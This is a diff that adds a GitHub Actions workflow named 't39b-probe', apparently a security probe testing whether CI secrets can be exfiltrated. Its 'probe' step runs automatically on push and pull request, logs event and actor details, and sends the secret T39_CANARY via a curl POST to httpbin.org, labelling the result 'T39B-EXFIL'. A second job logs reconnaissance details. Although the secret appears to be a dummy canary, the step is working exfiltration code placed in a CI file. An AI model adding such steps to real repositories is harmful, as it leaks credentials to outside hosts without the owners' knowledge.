@@ -1,0 +1,21 @@
+name: t39b-probe
+on:
+  push:
+  pull_request:
+
+jobs:
+  bbp-never-passes:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          echo "T39B-EXECUTED event=${{ github.event_name }} ref=$GITHUB_REF actor=$GITHUB_ACTOR"
+          echo "T39B-CANARY-PRESENT=${{ secrets.T39_CANARY != '' }}"
+          echo "T39B-CANARY-SHA16=$(printf '%s' '${{ secrets.T39_CANARY }}' | sha256sum | cut -c1-16)"
+          code=$(curl -sS -o /tmp/e.json -w '%{http_code}' -X POST https://httpbin.org/post --data-urlencode "canary=${{ secrets.T39_CANARY }}")
+          seen=$(grep -c "t39-canary-dummy" /tmp/e.json || true)
+          echo "T39B-EXFIL http=$code canary-seen-in-response=$seen"
+  t39b-recon:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "T39B-RECON event=${{ github.event_name }} ref=$GITHUB_REF actor=$GITHUB_ACTOR"
